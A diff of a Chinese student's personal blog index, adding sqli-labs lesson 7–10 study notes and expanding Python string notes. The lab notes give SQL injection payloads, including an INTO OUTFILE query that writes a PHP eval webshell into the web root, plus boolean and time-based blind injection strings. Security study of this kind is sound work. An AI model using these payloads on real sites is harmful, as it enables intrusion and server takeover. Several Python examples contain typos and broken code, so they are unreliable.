@@ -127,7 +127,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -176,6 +176,105 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/04/less7-8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/04/less7-8/" class="post-title-link" itemprop="url">less7-10</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-11-04 17:53:22 / Modified: 18:13:03" itemprop="dateCreated datePublished" datetime="2021-11-04T17:53:22+08:00">2021-11-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="less7（一句话木马的利用）"><a href="#less7（一句话木马的利用）" class="headerlink" title="less7（一句话木马的利用）"></a>less7（一句话木马的利用）</h1><p>首先按部就班试出</p>
+<p>？id=1‘))–+</p>
+<p>利用order by查出数据库列数 </p>
+<p>提示是use outfile </p>
+<p>into outfile 是写文件的指令，资料<a target="_blank" rel="noopener" href="https://blog.csdn.net/cuiruidu3106/article/details/100439103?utm_source=app&app_version=4.17.2&code=app_1562916241&uLinkId=usr1mkqgl919blen">引用csdn的大佬</a></p>
+<p>利用union select 1,2,‘&lt;?php @eval($_post[“crow”]);？&gt;’ into outfile “D:\phpstudy_pro\WWW\sqli-labs\Less-7\a.php”–+将一句话木马写入</p>
+<p><img src="https://i.loli.net/2021/11/04/xWTdpgA8jq5eXht.png" alt="QQ截图20211104171541.png"></p>
+<p>这里报错了没事，现在文件已经写到我们想要的地方</p>
+<p><img src="https://i.loli.net/2021/11/04/jZrFiNRp9PG4Az1.png" alt="QQ截图20211104173133.png"></p>
+<p>然后使用菜刀访问即可！</p>
+<p><img src="https://i.loli.net/2021/11/04/wWXQb2Tgo8EDuBJ.png" alt="QQ截图20211104171109.png"></p>
+<p>ps：操作前提该网站允许文件的读入操作，不然会一直报错且菜刀也访问不到文件。</p>
+<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><h2 id="方法一-布尔盲注"><a href="#方法一-布尔盲注" class="headerlink" title="方法一 布尔盲注"></a>方法一 布尔盲注</h2><p>输入？id=1‘判断存在注入错误</p>
+<p>输入？id=1’ order by 3–+ 当3改成4时报错说明只有4列</p>
+<p>输入？id=1‘and left（（database（）），1）=’s‘–+ 猜出第一位</p>
+<p>或者采用？id=1’‘and ascii（substr（（database（）），1,1））&gt;16</p>
+<p>或者输入？id=1’ and ascii((select schema_name from information_schema.schemata limit 1,1)1,1)&gt;17–+也可以回应，判断数据库名</p>
+<p>输入？id=1‘and acii（（select table_name from information_schema.tables where table_schema=’scurity’））&gt;115–+判断表名</p>
+<p>输入？id=1’and ascii（（select column_name from information_schema.columns where table_name=’user’））&gt;10–+判断表中字段。</p>
+<p>以上语句配合burpsuite进行使用（与lesson5,6同理）。</p>
+<h2 id="法二-时间盲注"><a href="#法二-时间盲注" class="headerlink" title="法二 时间盲注"></a>法二 时间盲注</h2><p>？id=1‘ and sleep（5）–+判断存在注入 如果可以会延迟5秒回应（对比可见延迟）</p>
+<p><img src="https://i.loli.net/2021/11/04/2d5OTQ68ZArtSMz.png" alt="QQ截图20211104174905.png"></p>
+<p><img src="https://i.loli.net/2021/11/04/xYsm5MioZyjcPFr.png" alt="QQ截图20211104175501.png"></p>
+<p>输入？id=1‘ and if(length(database())=8,1,sleep(5))–+如果为8则页面会较快的刷新，如果不为8则会延迟5秒刷新</p>
+<p>输入？id=1’ and if（ascii（substr（select database（），1,1））&gt;113,1,sleep(5))–+如果当前数据库的第一个字母的ascii值大于113的时候，会立刻返回结果，否则执行5秒</p>
+<h1 id="less-9和less-10"><a href="#less-9和less-10" class="headerlink" title="less 9和less 10"></a>less 9和less 10</h1><p>less9和less10中可以使用时间盲注但不可以使用布尔盲注，less10只是将单引号改成了双引号</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/28/python%E5%AD%A6%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -207,7 +306,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-10-30 00:05:10" itemprop="dateModified" datetime="2021-10-30T00:05:10+08:00">2021-10-30</time>
+        <time title="Modified: 2021-10-31 10:37:23" itemprop="dateModified" datetime="2021-10-31T10:37:23+08:00">2021-10-31</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -252,7 +351,7 @@
 <p>最简单的表达式是字面量。比如：a=123。运行过程中，解释器先运行右边的表达式，生成一个代表表达式运算的结果的对象：然后，将这个对象地址赋值给左边的变量。 </p>
 <h1 id="删除变量和垃圾回收机制"><a href="#删除变量和垃圾回收机制" class="headerlink" title="删除变量和垃圾回收机制"></a>删除变量和垃圾回收机制</h1><p>可以通过del语句删除不在使用的变量。如果对象没有变量应用，就会被回收器回收，清空内存空间。(自动回收)</p>
 <p><img src="https://i.loli.net/2021/10/29/pG53Y6WohDCKwbq.jpg" alt="Screenshot_20211029_193403_tv.danmaku.bili_edit_384119715821328.jpg"></p>
-<h1 id="基本内置数据类型介绍（和C-C-没区别）"><a href="#基本内置数据类型介绍（和C-C-没区别）" class="headerlink" title="基本内置数据类型介绍（和C/C++没区别）"></a>基本内置数据类型介绍（和C/C++没区别）</h1><h2 id="整型（int）"><a href="#整型（int）" class="headerlink" title="整型（int）"></a>整型（int）</h2><p>整数，2345，python2中整数是32位    -2^63^—2^63^-1之间的数,python3中int可以存储任意大小的数，long被取消。python3中可以做超大数的计算，而不会造成数据溢出。</p>
+<h1 id="基本内置数据类型介绍"><a href="#基本内置数据类型介绍" class="headerlink" title="基本内置数据类型介绍"></a>基本内置数据类型介绍</h1><h2 id="整型（int）"><a href="#整型（int）" class="headerlink" title="整型（int）"></a>整型（int）</h2><p>整数，2345，python2中整数是32位    -2^63^—2^63^-1之间的数,python3中int可以存储任意大小的数，long被取消。python3中可以做超大数的计算，而不会造成数据溢出。</p>
 <h2 id="浮点型（float）"><a href="#浮点型（float）" class="headerlink" title="浮点型（float）"></a>浮点型（float）</h2><p>小数，314*e-2，浮点数在内存中也是按照科学计数法来存储的。</p>
 <h2 id="布尔型（bool）"><a href="#布尔型（bool）" class="headerlink" title="布尔型（bool）"></a>布尔型（bool）</h2><p>表示真假，仅包含true，false，python2中没有bool值，直接用0,1表示，python3中true和false被定义成了关键字，但他们的本质还是0和1，甚至可以和数字相加。</p>
 <img src="https://i.loli.net/2021/10/29/rNcEseDIGWid1Zv.png" alt="QQ截图20211029232434_1_.png" style="zoom:200%;" />
@@ -265,15 +364,31 @@
 <p>使用内置函数chr()可以把十进制数转换成对应的字符。</p>
 <img src="https://i.loli.net/2021/10/29/8RjPFz9iNJKVHso.png" alt="QQ截图20211029235713_1_.png" style="zoom:200%;" />
 
-
-
-<h2 id="引号创建字符串"><a href="#引号创建字符串" class="headerlink" title="引号创建字符串"></a>引号创建字符串</h2><p>可以通过单引号或双引号创建字符串。如：a=’abc’;b=’sxt’</p>
+<h3 id="引号创建字符串"><a href="#引号创建字符串" class="headerlink" title="引号创建字符串"></a>引号创建字符串</h3><p>可以通过单引号或双引号创建字符串。如：a=’abc’;b=’sxt’</p>
 <p>使用两种引号的好处是可以创建本身就包含的引号的字符串，而不使用转义字符。如：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=<span class="string">&quot;I&#x27;m a teacher!&quot;</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> (a)</span><br><span class="line">&gt;&gt;&gt;b=<span class="string">&#x27;my_name is &quot;tom&quot;&#x27;</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> (b)</span><br></pre></td></tr></table></figure>
 
+<p>python 允许空字符的存在，不包含任何字符且长度为0</p>
+<p>用函数len()可以返回字符串的长度</p>
+<h3 id="转义字符串"><a href="#转义字符串" class="headerlink" title="转义字符串"></a>转义字符串</h3><p>使用“\+特殊符号“,来实现某些难以用字符表示的效果，比如换行等，常见的转义</p>
+<p><img src="https://i.loli.net/2021/10/30/IsWOnkX1jJPUE6B.png" alt="Screenshot_2021_1030_224611.png"></p>
+<p>例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=<span class="string">&#x27;I\nlove\nU&#x27;</span></span><br><span class="line">&gt;&gt;&gt;a</span><br></pre></td></tr></table></figure>
+
+<h3 id="字符串的拼接"><a href="#字符串的拼接" class="headerlink" title="字符串的拼接"></a>字符串的拼接</h3><h4 id="可以使用-将多个字符串拼接起来。例如：’aa‘-’bb‘-》’aabb‘"><a href="#可以使用-将多个字符串拼接起来。例如：’aa‘-’bb‘-》’aabb‘" class="headerlink" title="可以使用+将多个字符串拼接起来。例如：’aa‘+’bb‘==》’aabb‘"></a>可以使用+将多个字符串拼接起来。例如：’aa‘+’bb‘==》’aabb‘</h4><ol>
+<li>如果+两边都是字符串，则拼接</li>
+<li>如果+两边都是数字，则加法运算</li>
+<li>如果+两边类型不同，则抛出异常</li>
+</ol>
+<h4 id="可以将多个字面字符串直接放在一起实现拼接。例如：’aa‘-’bb‘-》’aabb‘"><a href="#可以将多个字面字符串直接放在一起实现拼接。例如：’aa‘-’bb‘-》’aabb‘" class="headerlink" title="可以将多个字面字符串直接放在一起实现拼接。例如：’aa‘ ’bb‘==》’aabb‘"></a>可以将多个字面字符串直接放在一起实现拼接。例如：’aa‘ ’bb‘==》’aabb‘</h4><h3 id="字符串的复制"><a href="#字符串的复制" class="headerlink" title="字符串的复制"></a>字符串的复制</h3><p>使用*可以实现字符串的复制。</p>
+<p>例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=<span class="string">&#x27;wds5418&#x27;</span>*<span class="number">3</span></span><br><span class="line">&gt;&gt;&gt;a</span><br></pre></td></tr></table></figure>
 
 
-<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="链式赋值"><a href="#链式赋值" class="headerlink" title="链式赋值"></a>链式赋值</h2><p>链式赋值用于同一个对象赋值给多个变量。</p>
+
+<h3 id="不换行打印"><a href="#不换行打印" class="headerlink" title="不换行打印"></a>不换行打印</h3><p>调用print时，会自动打印一个换行符，若，我们不想换行，可以通过参数end=’任意字符串‘，实现末尾添加任何类容。</p>
+<h3 id="从控制台读取字符串"><a href="#从控制台读取字符串" class="headerlink" title="从控制台读取字符串"></a>从控制台读取字符串</h3><p>通过input（）从控制台读取键盘输入的内容。</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="链式赋值"><a href="#链式赋值" class="headerlink" title="链式赋值"></a>链式赋值</h2><p>链式赋值用于同一个对象赋值给多个变量。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=y=z //相当于：x=<span class="number">123</span>,y=<span class="number">123</span></span><br></pre></td></tr></table></figure>
 
 
@@ -306,6 +421,52 @@
 <p>==用于判断引用变量对象的值是否相等，默认调用对象的—eq—()方法</p>
 <p>ps：整数缓存问题：</p>
 <p>python 仅仅对比较小的整数进行缓存（范围为[-5,256]），而并非是所有的整数对象。需要注意的是，这仅仅是在 命令行中执行，而在pycham或者保存为文件执行，结果是不一样的，这是因为解释器做了一部分优化（范围[-5,任何正整数]）。</p>
+<h2 id="str（）实现数字转型字符串"><a href="#str（）实现数字转型字符串" class="headerlink" title="str（）实现数字转型字符串"></a>str（）实现数字转型字符串</h2><p>str()可以帮助我们将其他数据类型转换为字符串。例：</p>
+<p>str（5.20）==》’5.20‘</p>
+<p>当我们调用print（）函数时，解释器自动调用了str（）将非字符串的对象转化成了字符串。</p>
+<h2 id="使用-提取字符"><a href="#使用-提取字符" class="headerlink" title="使用[]提取字符"></a>使用[]提取字符</h2><p>字符串的本质是字符序列，通过在字符串后面添加[]，在[]里面指定偏移量，可以提取该位置的单个字符。</p>
+<h3 id="正向搜索"><a href="#正向搜索" class="headerlink" title="正向搜索"></a>正向搜索</h3><p>最左侧的第一个字符，偏移量为0，第二个偏移量为1，以此类推，直到len（str）-1为止</p>
+<h3 id="反向搜索："><a href="#反向搜索：" class="headerlink" title="反向搜索："></a>反向搜索：</h3><p>最右边第一字符，偏移量为-1，倒数第二个为-2，以此类推，直到-len（str）为止</p>
+<h2 id="replace-实现字符串替换"><a href="#replace-实现字符串替换" class="headerlink" title="replace()实现字符串替换"></a>replace()实现字符串替换</h2><p>字符串是“是不可变量”的，通过[]可以获取字符串指定位置的字符，但不能改变字符串，尝试改变字符串中的某个字符，就会报错。字符串虽然不可改变，但是，可以创建新的字符串来实现。</p>
+<p>replace（’字符‘，’新字符‘）返回值是一个新的字符串</p>
+<h2 id="字符串切片slice操作"><a href="#字符串切片slice操作" class="headerlink" title="字符串切片slice操作"></a>字符串切片slice操作</h2><p>可以快速地提取字符串，标准格式为：</p>
+<p>[起始偏移值start：终止偏移量end:步长step]  </p>
+<p>PS:默认包头不包尾;可以利用步长来跳取字符</p>
+<h2 id="spit（）分割和join（）合并"><a href="#spit（）分割和join（）合并" class="headerlink" title="spit（）分割和join（）合并"></a>spit（）分割和join（）合并</h2><p>spite（）可以基于指定分隔符将字符串分隔成多个子字符串（存储到列表中）。如果不指定分割符，则默认使用空白字符（换行符/空格/制表符）示例代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=<span class="string">&#x27;to be or not to be&#x27;</span></span><br><span class="line">&gt;&gt;&gt;a.spite（）</span><br><span class="line">[<span class="string">&#x27;to&#x27;</span>,<span class="string">&#x27;be&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;not&#x27;</span>,<span class="string">&#x27;to&#x27;</span>,<span class="string">&#x27;be&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;a.spite(be)</span><br><span class="line">[<span class="string">&#x27;to &#x27;</span>,<span class="string">&#x27;or not to &#x27;</span>,<span class="string">&#x27;&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>join()的作用正好相反，用于将一系列子字符串连接起来例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=[<span class="string">&#x27;sxt&#x27;</span>,<span class="string">&#x27;sxt100&#x27;</span>,<span class="string">&#x27;swt200&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;<span class="string">&#x27;*&#x27;</span>,join(a)</span><br><span class="line"><span class="string">&#x27;sxt*sxt100*sxt200&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>拼接字符串的要点：</p>
+<p>使用字符串接符+，会生成新的字符串对象，因此不推荐使用+来拼接字符，推荐使用join（）函数，因为join函数在拼接语言字符串之前会计算所有字符的长度，然后逐一拷贝，仅新建一次对象。</p>
+<p>操作：测试品节符和join（），不同的效率</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time01=time.time() <span class="comment">#起始时间</span></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rang(<span class="number">10000</span>):</span><br><span class="line">	a+=<span class="string">&#x27;sxt&#x27;</span></span><br><span class="line">time02=time.time() <span class="comment">#终止时间</span></span><br><span class="line"><span class="built_in">print</span>(time02-time01)</span><br><span class="line">time03=time.time()<span class="comment">#起始时间</span></span><br><span class="line">li=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rang(<span class="number">10000</span>):</span><br><span class="line">    li.append(sxt)</span><br><span class="line">a=<span class="string">&#x27;&#x27;</span>,join(li)</span><br><span class="line">time04=time.time()<span class="comment">#终止时间</span></span><br><span class="line"><span class="built_in">print</span>（time03-time04）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="字符串驻留机制和字符串同一性判定"><a href="#字符串驻留机制和字符串同一性判定" class="headerlink" title="字符串驻留机制和字符串同一性判定"></a>字符串驻留机制和字符串同一性判定</h2><p>字符串驻留：仅保存一份相同且不可变的字符串的方法，不同的值域被存放在字符串驻留池。python支持字符串驻留机制，对于符合标识符规则的字符串（仅包含下划线（_）,字母和数字会启用字符串驻留机制。</p>
+<h2 id="常用的查找方法"><a href="#常用的查找方法" class="headerlink" title="常用的查找方法"></a>常用的查找方法</h2><p><img src="https://i.loli.net/2021/10/31/NuiZ1PecKJ49UtQ.png" alt="Screenshot_20211031_093328_tv.danmaku.bili.png"></p>
+<p><img src="https://i.loli.net/2021/10/31/Frt16LS3lsWo2EJ.png" alt="Screenshot_20211031_093955_tv.danmaku.bili.png"></p>
+<h2 id="去除首尾信息"><a href="#去除首尾信息" class="headerlink" title="去除首尾信息"></a>去除首尾信息</h2><p>通过strip（）去处字符串首尾指定信息。通过istrip（）去除左边指定信息，rstrip（）去除字符串右边指定信息。</p>
+<h2 id="大小写的转换"><a href="#大小写的转换" class="headerlink" title="大小写的转换"></a>大小写的转换</h2><p><img src="https://i.loli.net/2021/10/31/v1uT2NpasLxMQKD.png" alt="Screenshot_20211031_094634_tv.danmaku.bili.png"></p>
+<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><ol>
+<li>isalnum（）是否都为字母和数字</li>
+<li>isalpha（）检测字符串是否只由字母组成（含汉字）</li>
+<li>isdigit（）检查字符串是否只由数字组成</li>
+<li>isspace（）检测是否为空白符</li>
+<li>isupper（）是否为大写字母</li>
+<li>islower（）是否为小写字母</li>
+</ol>
+<h2 id="字符串的格式化"><a href="#字符串的格式化" class="headerlink" title="字符串的格式化"></a>字符串的格式化</h2><p>python2.6开始，新增了一种格式化字符串的函数 str.format(),它增强了字符串格式化的功能。</p>
+<p>基本语法是通过{}和：来替代以前的%</p>
+<p>format函数可以接受不限个参数，位置可以不安顺序。</p>
+<p><img src="https://i.loli.net/2021/10/31/qzAPc9pVS2oFeJU.png" alt="QQ截图20211031101849.png"></p>
+<h2 id="填充与对齐"><a href="#填充与对齐" class="headerlink" title="填充与对齐"></a>填充与对齐</h2><p>填充和对齐一起使用^,&lt;,&gt;分别是居中，左对齐，右对齐，后面带宽度</p>
+<p>：号后面带填充的字符，只能是一个字符，不指定的话默认是用空格填充</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&quot;&#123;:*&gt;8&#125;&quot;</span>.frmat(<span class="string">&quot;245&quot;</span>)</span><br><span class="line"><span class="string">&#x27;*****245&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="数字的格式化"><a href="#数字的格式化" class="headerlink" title="数字的格式化"></a>数字的格式化</h2><p><img src="https://i.loli.net/2021/10/31/9UCYOGm4dMoxehH.png" alt="Screenshot_20211031_103425_tv.danmaku.bili.png"></p>
 <h1 id="时间的表示"><a href="#时间的表示" class="headerlink" title="时间的表示"></a>时间的表示</h1><p>计算机中时间的表示是从“1970年1月1日 00:00:00”开始的，以毫秒（1/1000秒）进行计算的。我们也把1970年这个时刻记为“unix时间点”。</p>
 <p>这样，我们就把时间全部用数字表示了。</p>
 <p><img src="https://i.loli.net/2021/10/29/7xdYnAcwfOSB4D2.png" alt="Screenshot_20211029_203817_tv.danmaku.bili.png"></p>
@@ -801,7 +962,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-10-25 23:47:26" itemprop="dateModified" datetime="2021-10-25T23:47:26+08:00">2021-10-25</time>
+        <time title="Modified: 2021-10-27 21:57:54" itemprop="dateModified" datetime="2021-10-27T21:57:54+08:00">2021-10-27</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1258,91 +1419,6 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1 id="冷知识"><a href="#冷知识" class="headerlink" title="冷知识"></a>冷知识</h1><h2 id="冷知识1号-robort-txt中藏着不允许和允许探测的文件名"><a href="#冷知识1号-robort-txt中藏着不允许和允许探测的文件名" class="headerlink" title="冷知识1号: robort.txt中藏着不允许和允许探测的文件名"></a>冷知识1号: robort.txt中藏着不允许和允许探测的文件名</h2><h2 id="冷知识2号-ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作"><a href="#冷知识2号-ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作" class="headerlink" title="冷知识2号: ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作"></a>冷知识2号: ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作</h2><h2 id="冷知识3号-crawl-爬行-指顺这内部链接访问网站内页，再顺着导出链接访问其他网站"><a href="#冷知识3号-crawl-爬行-指顺这内部链接访问网站内页，再顺着导出链接访问其他网站" class="headerlink" title="冷知识3号: crawl(爬行)指顺这内部链接访问网站内页，再顺着导出链接访问其他网站"></a>冷知识3号: crawl(爬行)指顺这内部链接访问网站内页，再顺着导出链接访问其他网站</h2><h2 id="冷知识4号-audit-审计-指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程"><a href="#冷知识4号-audit-审计-指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程" class="headerlink" title="冷知识4号: audit(审计)指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程"></a>冷知识4号: audit(审计)指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程</h2><h2 id="HTTP-Referer-告知服务器请求来源（浏览器自动加上）"><a href="#HTTP-Referer-告知服务器请求来源（浏览器自动加上）" class="headerlink" title="HTTP Referer: 告知服务器请求来源（浏览器自动加上）"></a>HTTP Referer: 告知服务器请求来源（浏览器自动加上）</h2><h3 id="302或301状态码表示跳转"><a href="#302或301状态码表示跳转" class="headerlink" title="302或301状态码表示跳转"></a>302或301状态码表示跳转</h3><h3 id="Cookie-服务器颁发的凭证"><a href="#Cookie-服务器颁发的凭证" class="headerlink" title="Cookie: 服务器颁发的凭证"></a>Cookie: 服务器颁发的凭证</h3><h3 id="网页-HTML-JS-CSS"><a href="#网页-HTML-JS-CSS" class="headerlink" title="网页=HTML+JS+CSS"></a>网页=HTML+JS+CSS</h3><h2 id="JS-给网页添加动态效果"><a href="#JS-给网页添加动态效果" class="headerlink" title="JS: 给网页添加动态效果"></a>JS: 给网页添加动态效果</h2><h2 id="CSS-给网页添加样式和图片"><a href="#CSS-给网页添加样式和图片" class="headerlink" title="CSS: 给网页添加样式和图片"></a>CSS: 给网页添加样式和图片</h2><h2 id="Html-超文本标记语言能加载CSS图片和JS样式"><a href="#Html-超文本标记语言能加载CSS图片和JS样式" class="headerlink" title="Html: 超文本标记语言能加载CSS图片和JS样式"></a>Html: 超文本标记语言能加载CSS图片和JS样式</h2><hr>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/" class="post-title-link" itemprop="url">“菜鸟笔记1号”</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-09-19 13:24:27" itemprop="dateCreated datePublished" datetime="2021-09-19T13:24:27+08:00">2021-09-19</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-10-25 23:43:41" itemprop="dateModified" datetime="2021-10-25T23:43:41+08:00">2021-10-25</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%B8%B8%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">常识</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="对于一个给定对应IP地址的靶场机器挖掘开放服务信息"><a href="#对于一个给定对应IP地址的靶场机器挖掘开放服务信息" class="headerlink" title="对于一个给定对应IP地址的靶场机器挖掘开放服务信息"></a>对于一个给定对应IP地址的靶场机器挖掘开放服务信息</h2><h3 id="为了得到靶场开放服务和服务版可使用"><a href="#为了得到靶场开放服务和服务版可使用" class="headerlink" title="为了得到靶场开放服务和服务版可使用"></a>为了得到靶场开放服务和服务版可使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -sV +IP</span><br></pre></td></tr></table></figure>
-<h3 id="为了得到靶场全部信息"><a href="#为了得到靶场全部信息" class="headerlink" title="为了得到靶场全部信息"></a>为了得到靶场全部信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -A -v+IP</span><br></pre></td></tr></table></figure>
-<h3 id="对开放http的服务用浏览器访问"><a href="#对开放http的服务用浏览器访问" class="headerlink" title="对开放http的服务用浏览器访问"></a>对开放http的服务用浏览器访问</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -o+IP</span><br></pre></td></tr></table></figure>
-<h3 id="探索该服务的隐藏文件"><a href="#探索该服务的隐藏文件" class="headerlink" title="探索该服务的隐藏文件"></a>探索该服务的隐藏文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dirb</span> http//***/</span><br></pre></td></tr></table></figure>
-<h3 id="查找具有权限root的文件"><a href="#查找具有权限root的文件" class="headerlink" title="查找具有权限root的文件"></a>查找具有权限root的文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span> / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<hr>
 
       
     </div>
